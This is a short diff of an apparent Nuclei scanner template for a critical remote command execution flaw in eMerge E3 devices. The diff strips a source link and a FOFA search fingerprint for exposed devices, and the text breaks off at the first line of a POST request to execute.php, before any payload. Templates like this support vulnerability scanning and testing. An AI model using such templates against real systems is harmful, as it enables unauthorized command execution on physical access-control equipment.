@@ -3,12 +3,8 @@ info:
   name: eMerge E3 execute.php存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: rce,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: title="emerge"
 http:
 - raw:
   - 'POST /diagnostic/controller/execute.php HTTP/1.1
